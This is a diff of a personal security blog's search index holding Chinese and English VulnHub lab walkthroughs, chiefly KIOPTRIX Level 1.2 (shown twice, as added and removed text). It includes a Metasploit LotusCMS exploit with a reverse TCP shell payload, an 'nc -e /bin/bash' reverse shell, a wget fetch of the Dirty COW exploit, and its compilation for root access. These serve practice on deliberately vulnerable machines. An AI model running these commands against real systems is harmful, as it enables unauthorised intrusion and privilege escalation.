@@ -1,6 +1,14 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>HackTheBox</title>
+    <url>/2024/12/09/HackTheBox/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
+      <tags>
+        <tag>HackTheBox</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HACK ME PLEASE: 1</title>
     <url>/2024/11/30/HACK-ME-PLEASE-1/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link"   href="https://www.vulnhub.com/entry/hack-me-please-1,731/" >靶機簡介<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
@@ -253,14 +261,6 @@
       </tags>
   </entry>
   <entry>
-    <title>HackTheBox</title>
-    <url>/2024/12/09/HackTheBox/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
-      <tags>
-        <tag>HackTheBox</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>KIOPTRIX: LEVEL 1.1</title>
     <url>/2024/11/30/KIOPTRIX-LEVEL-1-1/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link" href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/">靶機簡介<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
@@ -311,6 +311,112 @@
 <p>如果想解warning，<code>echo &gt;&gt; 9542.c</code>這個命令利用了 echo 命令用於輸出文本，以及 &gt;&gt; 重定向操作符用於將輸出附加到文件末尾。當這個命令運行時，它將一個空字符串（即一個換行符號）添加到指定文件的末尾。這是一種快速且常見的方式，特別是當需要手動在文件末尾插入換行符號時。然而，這種方法僅限於向文件末尾添加換行符號，並假設文件 9542.c 已經存在。如果文件不存在，則這個命令將創建一個新文件。<br><br><br><br></p>
 <div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./exploit</span><br><span class="line">whoami</span><br><span class="line">id</span><br></pre></td></tr></table></figure></div>
 <p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ryekITjKT.png" alt="image"></p>
+]]></content>
+      <tags>
+        <tag>VulnHub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>KIOPTRIX: LEVEL 1.3</title>
+    <url>/2024/11/30/KIOPTRIX-LEVEL-1-3/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link"   href="https://www.vulnhub.com/entry/kioptrix-level-13-4%2C25/" >Target<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><strong>Virtual Machine</strong><br>Format: Virtual Machine (VMware)<br>Operating System: Linux</p>
+<p><strong>Networking</strong><br>DHCP service: Enabled<br>IP address: Automatically assign</p>
+<br>
+<br>
+
+<h2 id="Former-Job"><a href="#Former-Job" class="headerlink" title="Former Job"></a><strong>Former Job</strong></h2><ul>
+<li>Import to VMware</li>
+<li>Virtual machine configuration with different networks-Bridged(<a class="link"   href="https://blog.csdn.net/Attsky/article/details/109320325" >Network<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>、<a class="link"   href="https://blog.csdn.net/qq1069380146/article/details/111995334" >IP<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/BkJ6mp_tp.png"
+                      width="50%" height="40%"
+                >
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/rJOQumtKT.png"
+                      width="50%" height="40%"
+                ></li>
+<li><a class="link"   href="https://youtu.be/6P6ff8onNzk?si=xB0xUZfX43sZ2Zmk" >Reference<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+</ul>
+<br>
+<br>
+
+<h2 id="Step-1-Scan"><a href="#Step-1-Scan" class="headerlink" title="Step 1: Scan"></a><strong>Step 1: Scan</strong></h2><ol>
+<li>Confirm my IP address.<br><code>ifconfig</code><br>I found that my IP address.<code>192.168.1.113</code>。<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/vulnhub/4/0.png"
+                      width="600" height="800"
+                ></li>
+<li>Search the target.<br><code>sudo netdiscover -r 192.168.1.0/24</code><br>I think the target is 192.168.1.112<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/vulnhub/4/1.png"
+                      width="600" height="800"
+                ></li>
+<li>Nmap scan the services.<br><code>sudo nmap -A -T4 192.168.1.112</code><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/vulnhub/4/2.png"
+                      width="600" height="800"
+                ></li>
+</ol>
+<h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a><strong>Step 2</strong></h2><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a><strong>Step 3</strong></h2><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a><strong>Step 4</strong></h2><h2 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a><strong>Step 5</strong></h2>]]></content>
+      <tags>
+        <tag>VulnHub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>KIOPTRIX: LEVEL 1.2</title>
+    <url>/2024/11/30/KIOPTRIX-LEVEL-1-2/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link" href="https://www.vulnhub.com/entry/kioptrix-level-12-3,24/">靶機簡介<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><strong>Virtual Machine</strong><br>Format: Virtual Machine (VMware)<br>Operating System: Linux</p>
+<p><strong>Networking</strong><br>DHCP service: Enabled<br>IP address: Automatically assign</p>
+<br>
+<br>
+
+<p><strong>前置工作</strong></p>
+<ul>
+<li>匯入 VMware</li>
+<li>虛擬機配置不同網路-Bridged(<a class="link" href="https://blog.csdn.net/Attsky/article/details/109320325">網路<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>、<a class="link" href="https://blog.csdn.net/qq1069380146/article/details/111995334">IP<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BkJ6mp_tp.png" alt="image"><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJOQumtKT.png" alt="image"></li>
+<li><a class="link" href="https://youtu.be/KgG-r32jvDc?si=M1Ho6yPDYaliLqOU">教學影片<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/B1pNd8z5p.png" alt="image"></li>
+</ul>
+<br>
+<br>
+
+<h2 id="步驟一、搜索目標"><a href="#步驟一、搜索目標" class="headerlink" title="步驟一、搜索目標"></a>步驟一、搜索目標</h2><p>查找自己IP。<code>ifconfig</code>。自己IP為<code>192.168.0.8</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/Bkq9uUz9a.png" alt="image"></p>
+<p>搜索靶機IP。<code>sudo netdiscover -r 192.168.0.0/24</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/Hk2qt8fca.png" alt="image"></p>
+<p>目標為<code>192.168.0.10</code>。<br>nmap掃其服務<code>sudo nmap -A -T4 192.168.0.10</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/By6Vq8M5T.png" alt="image"><br>其http有網頁服務。<code>http://192.168.0.10/</code>。</p>
+<p><code>whatweb 192.168.0.10</code>。觀察其中含有<code>HTTPServer</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HyswZvG96.png" alt="image"></p>
+<p>在Blog中觀察到有<code>http://kioptrix3.com/gallery</code>。<br>在Login中使用普通 SQL Injection 手法進不去。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SJzk4PM5a.png" alt="image"><br>觀察登入處最下方有<code>Proudly Powered by: LotusCMS</code>。<br><br><br><br></p>
+<h2 id="步驟二、針對其服務探索"><a href="#步驟二、針對其服務探索" class="headerlink" title="步驟二、針對其服務探索"></a>步驟二、針對其服務探索</h2><p><code>searchsploit LotusCMS</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BJZuSvMcp.png" alt="image"></p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole -q</span><br><span class="line">search Lotus</span><br><span class="line">search LotusCMS</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/r1HUIvz9p.png" alt="image"><br><br></p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">use 0</span><br><span class="line">set payload generic/shell_reverse_tcp</span><br><span class="line">show options</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/B1ZxTPzqp.png" alt="image"><br><br></p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">set RHOSTS 192.168.0.10</span><br><span class="line">set URI /</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></div>
+<p>set URI / 的含義是將模塊的 URI 選項設置為 /。具體而言，用於指定攻擊目標的URI（Uniform Resource Identifier），即指定攻擊目標的路徑或位置。這很重要。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/S1SLTDMq6.png" alt="image"><br><br></p>
+<p>使用<code>id</code>查看身分。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BJl00wGca.png" alt="image"><br><br><br><br></p>
+<h2 id="步驟三、另闢蹊徑取得權限"><a href="#步驟三、另闢蹊徑取得權限" class="headerlink" title="步驟三、另闢蹊徑取得權限"></a>步驟三、另闢蹊徑取得權限</h2><p><code>uname -a</code>得到系統 Linux Kernel 版本<code>2.6.24</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HJqQZOG5T.png" alt="image"></p>
+<p><code>searchsploit Kernel 2.6.24</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ry-yQ_zca.png" alt="image"></p>
+<p>其中有一段：<br><code>Linux Kernel 2.6.22 &lt; 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)                       | linux/local/40839.c</code></p>
+<p>“Dirty COW” 是一個影響 Linux Kernel 的特權升級漏洞，受影響版本為 2.6.22 到 3.9。漏洞利用了 PTRACE_POKEDATA 的競爭條件，攻擊者可以通過修改內核內存，實現特權升級。攻擊可能利用 <code>/etc/passwd</code> 文件，向其中添加具有特權的新用戶。系統管理員應盡快更新 Kernel 以修補此漏洞。提供的 <code>40839.c</code> 文件可能是漏洞利用代碼的參考。</p>
+<p><code>searchsploit -m linux/local/40839.c</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rkjLXdfqp.png" alt="image"></p>
+<p><code>python3 -m http.server</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/B1EkSOf9T.png" alt="image"><br><br><br><br></p>
+<h2 id="步驟四、建立連線"><a href="#步驟四、建立連線" class="headerlink" title="步驟四、建立連線"></a>步驟四、建立連線</h2><p>發現其shell跳不到/tmp。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HyowL_zqT.png" alt="image"></p>
+<p>開啟另一個shell。<code>sudo nc -nlvp 6666</code>。開啟監聽。<br>在原本Shell輸入<code>nc -e /bin/bash 192.168.0.8 6666</code>與另一個shell建立連線。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ryNQuOzcT.png" alt="image"><br><br></p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">python -c 'import pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure></div>
+<p><code>python -c</code>：啟動 Python 解釋器並運行指定的 Python 代碼。<br><code>'import pty;pty.spawn("/bin/bash")'</code>：這是一個簡短的 Python 腳本，其中 import pty 導入 pty 模塊，而 pty.spawn(“/bin/bash”) 則啟動一個交互式的 Bash shell。這個 Python 命令使用 pty 模塊在 Linux 系統中生成一個交互式的 Bash shell。通過執行這條命令，你可以將一個非交互式的 shell 提升為交互式，方便進行進一步的操作。這樣的技巧通常在渗透測試和安全測試中使用，但應僅在合法且得到授權的環境中進行。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SyMTd_zc6.png" alt="image"></p>
+<p><code>wget http://192.168.0.8:8000/40839.c</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/Sk14q_Gqa.png" alt="image"><br><br><br><br></p>
+<h2 id="步驟五、漏洞內容"><a href="#步驟五、漏洞內容" class="headerlink" title="步驟五、漏洞內容"></a>步驟五、漏洞內容</h2><p>裡面有使用教學。<code>cat 40839.c</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/H1M0qOf5p.png" alt="image"></p>
+<p>按照其敘述。</p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -pthread 40839.c -o try -lcrypt</span><br><span class="line">ls -alh</span><br><span class="line">./try</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/Bk6w6dG9p.png" alt="image"><br><br><br><br></p>
+<h2 id="步驟六、取得權限"><a href="#步驟六、取得權限" class="headerlink" title="步驟六、取得權限"></a>步驟六、取得權限</h2><div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">su - firefart</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">輸入密碼</span></span><br><span class="line">id</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BJyDAOM9a.png" alt="image"></p>
 ]]></content>
       <tags>
         <tag>VulnHub</tag>
@@ -424,116 +530,10 @@
 ]]></content>
   </entry>
   <entry>
-    <title>KIOPTRIX: LEVEL 1.3</title>
-    <url>/2024/11/30/KIOPTRIX-LEVEL-1-3/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link"   href="https://www.vulnhub.com/entry/kioptrix-level-13-4%2C25/" >Target<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<p><strong>Virtual Machine</strong><br>Format: Virtual Machine (VMware)<br>Operating System: Linux</p>
-<p><strong>Networking</strong><br>DHCP service: Enabled<br>IP address: Automatically assign</p>
-<br>
-<br>
-
-<h2 id="Former-Job"><a href="#Former-Job" class="headerlink" title="Former Job"></a><strong>Former Job</strong></h2><ul>
-<li>Import to VMware</li>
-<li>Virtual machine configuration with different networks-Bridged(<a class="link"   href="https://blog.csdn.net/Attsky/article/details/109320325" >Network<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>、<a class="link"   href="https://blog.csdn.net/qq1069380146/article/details/111995334" >IP<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/BkJ6mp_tp.png"
-                      width="50%" height="40%"
-                >
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/rJOQumtKT.png"
-                      width="50%" height="40%"
-                ></li>
-<li><a class="link"   href="https://youtu.be/6P6ff8onNzk?si=xB0xUZfX43sZ2Zmk" >Reference<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
-</ul>
-<br>
-<br>
-
-<h2 id="Step-1-Scan"><a href="#Step-1-Scan" class="headerlink" title="Step 1: Scan"></a><strong>Step 1: Scan</strong></h2><ol>
-<li>Confirm my IP address.<br><code>ifconfig</code><br>I found that my IP address.<code>192.168.1.113</code>。<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/vulnhub/4/0.png"
-                      width="600" height="800"
-                ></li>
-<li>Search the target.<br><code>sudo netdiscover -r 192.168.1.0/24</code><br>I think the target is 192.168.1.112<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/vulnhub/4/1.png"
-                      width="600" height="800"
-                ></li>
-<li>Nmap scan the services.<br><code>sudo nmap -A -T4 192.168.1.112</code><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/vulnhub/4/2.png"
-                      width="600" height="800"
-                ></li>
-</ol>
-<h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a><strong>Step 2</strong></h2><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a><strong>Step 3</strong></h2><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a><strong>Step 4</strong></h2><h2 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a><strong>Step 5</strong></h2>]]></content>
-      <tags>
-        <tag>VulnHub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>KIOPTRIX: LEVEL 1.2</title>
-    <url>/2024/11/30/KIOPTRIX-LEVEL-1-2/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link" href="https://www.vulnhub.com/entry/kioptrix-level-12-3,24/">靶機簡介<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<p><strong>Virtual Machine</strong><br>Format: Virtual Machine (VMware)<br>Operating System: Linux</p>
-<p><strong>Networking</strong><br>DHCP service: Enabled<br>IP address: Automatically assign</p>
-<br>
-<br>
-
-<p><strong>前置工作</strong></p>
-<ul>
-<li>匯入 VMware</li>
-<li>虛擬機配置不同網路-Bridged(<a class="link" href="https://blog.csdn.net/Attsky/article/details/109320325">網路<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>、<a class="link" href="https://blog.csdn.net/qq1069380146/article/details/111995334">IP<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BkJ6mp_tp.png" alt="image"><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJOQumtKT.png" alt="image"></li>
-<li><a class="link" href="https://youtu.be/KgG-r32jvDc?si=M1Ho6yPDYaliLqOU">教學影片<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/B1pNd8z5p.png" alt="image"></li>
-</ul>
-<br>
-<br>
-
-<h2 id="步驟一、搜索目標"><a href="#步驟一、搜索目標" class="headerlink" title="步驟一、搜索目標"></a>步驟一、搜索目標</h2><p>查找自己IP。<code>ifconfig</code>。自己IP為<code>192.168.0.8</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/Bkq9uUz9a.png" alt="image"></p>
-<p>搜索靶機IP。<code>sudo netdiscover -r 192.168.0.0/24</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/Hk2qt8fca.png" alt="image"></p>
-<p>目標為<code>192.168.0.10</code>。<br>nmap掃其服務<code>sudo nmap -A -T4 192.168.0.10</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/By6Vq8M5T.png" alt="image"><br>其http有網頁服務。<code>http://192.168.0.10/</code>。</p>
-<p><code>whatweb 192.168.0.10</code>。觀察其中含有<code>HTTPServer</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HyswZvG96.png" alt="image"></p>
-<p>在Blog中觀察到有<code>http://kioptrix3.com/gallery</code>。<br>在Login中使用普通 SQL Injection 手法進不去。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SJzk4PM5a.png" alt="image"><br>觀察登入處最下方有<code>Proudly Powered by: LotusCMS</code>。<br><br><br><br></p>
-<h2 id="步驟二、針對其服務探索"><a href="#步驟二、針對其服務探索" class="headerlink" title="步驟二、針對其服務探索"></a>步驟二、針對其服務探索</h2><p><code>searchsploit LotusCMS</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BJZuSvMcp.png" alt="image"></p>
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole -q</span><br><span class="line">search Lotus</span><br><span class="line">search LotusCMS</span><br></pre></td></tr></table></figure></div>
-<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/r1HUIvz9p.png" alt="image"><br><br></p>
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">use 0</span><br><span class="line">set payload generic/shell_reverse_tcp</span><br><span class="line">show options</span><br></pre></td></tr></table></figure></div>
-<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/B1ZxTPzqp.png" alt="image"><br><br></p>
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">set RHOSTS 192.168.0.10</span><br><span class="line">set URI /</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></div>
-<p>set URI / 的含義是將模塊的 URI 選項設置為 /。具體而言，用於指定攻擊目標的URI（Uniform Resource Identifier），即指定攻擊目標的路徑或位置。這很重要。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/S1SLTDMq6.png" alt="image"><br><br></p>
-<p>使用<code>id</code>查看身分。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BJl00wGca.png" alt="image"><br><br><br><br></p>
-<h2 id="步驟三、另闢蹊徑取得權限"><a href="#步驟三、另闢蹊徑取得權限" class="headerlink" title="步驟三、另闢蹊徑取得權限"></a>步驟三、另闢蹊徑取得權限</h2><p><code>uname -a</code>得到系統 Linux Kernel 版本<code>2.6.24</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HJqQZOG5T.png" alt="image"></p>
-<p><code>searchsploit Kernel 2.6.24</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ry-yQ_zca.png" alt="image"></p>
-<p>其中有一段：<br><code>Linux Kernel 2.6.22 &lt; 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)                       | linux/local/40839.c</code></p>
-<p>“Dirty COW” 是一個影響 Linux Kernel 的特權升級漏洞，受影響版本為 2.6.22 到 3.9。漏洞利用了 PTRACE_POKEDATA 的競爭條件，攻擊者可以通過修改內核內存，實現特權升級。攻擊可能利用 <code>/etc/passwd</code> 文件，向其中添加具有特權的新用戶。系統管理員應盡快更新 Kernel 以修補此漏洞。提供的 <code>40839.c</code> 文件可能是漏洞利用代碼的參考。</p>
-<p><code>searchsploit -m linux/local/40839.c</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rkjLXdfqp.png" alt="image"></p>
-<p><code>python3 -m http.server</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/B1EkSOf9T.png" alt="image"><br><br><br><br></p>
-<h2 id="步驟四、建立連線"><a href="#步驟四、建立連線" class="headerlink" title="步驟四、建立連線"></a>步驟四、建立連線</h2><p>發現其shell跳不到/tmp。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HyowL_zqT.png" alt="image"></p>
-<p>開啟另一個shell。<code>sudo nc -nlvp 6666</code>。開啟監聽。<br>在原本Shell輸入<code>nc -e /bin/bash 192.168.0.8 6666</code>與另一個shell建立連線。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ryNQuOzcT.png" alt="image"><br><br></p>
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">python -c 'import pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure></div>
-<p><code>python -c</code>：啟動 Python 解釋器並運行指定的 Python 代碼。<br><code>'import pty;pty.spawn("/bin/bash")'</code>：這是一個簡短的 Python 腳本，其中 import pty 導入 pty 模塊，而 pty.spawn(“/bin/bash”) 則啟動一個交互式的 Bash shell。這個 Python 命令使用 pty 模塊在 Linux 系統中生成一個交互式的 Bash shell。通過執行這條命令，你可以將一個非交互式的 shell 提升為交互式，方便進行進一步的操作。這樣的技巧通常在渗透測試和安全測試中使用，但應僅在合法且得到授權的環境中進行。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SyMTd_zc6.png" alt="image"></p>
-<p><code>wget http://192.168.0.8:8000/40839.c</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/Sk14q_Gqa.png" alt="image"><br><br><br><br></p>
-<h2 id="步驟五、漏洞內容"><a href="#步驟五、漏洞內容" class="headerlink" title="步驟五、漏洞內容"></a>步驟五、漏洞內容</h2><p>裡面有使用教學。<code>cat 40839.c</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/H1M0qOf5p.png" alt="image"></p>
-<p>按照其敘述。</p>
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -pthread 40839.c -o try -lcrypt</span><br><span class="line">ls -alh</span><br><span class="line">./try</span><br></pre></td></tr></table></figure></div>
-<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/Bk6w6dG9p.png" alt="image"><br><br><br><br></p>
-<h2 id="步驟六、取得權限"><a href="#步驟六、取得權限" class="headerlink" title="步驟六、取得權限"></a>步驟六、取得權限</h2><div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">su - firefart</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">輸入密碼</span></span><br><span class="line">id</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure></div>
-<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BJyDAOM9a.png" alt="image"></p>
-]]></content>
-      <tags>
-        <tag>VulnHub</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>PortSwigger</title>
     <url>/2024/12/03/PortSwigger/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul>
-<li><a class="link"   href="https://di3n0.github.io/2024/12/03/SQL-Injection/" >SQL-Injection<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+<li><a class="link"   href="https://di3n0.github.io/2024/12/09/SQL-Injection/" >SQL-Injection<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
 <li><a class="link"   href="https://di3n0.github.io/2024/12/09/SSRF/" >SSRF<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
 </ul>
 <p><br><br><br><br><br><br></p>
@@ -567,36 +567,6 @@
 ]]></content>
       <tags>
         <tag>other</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>VulnHub</title>
-    <url>/2024/11/30/VulnHub/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a class="link" href="https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview">EXERCISE.LIST<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<h2 id="PWK-V1"><a href="#PWK-V1" class="headerlink" title="PWK V1"></a>PWK V1</h2><ul>
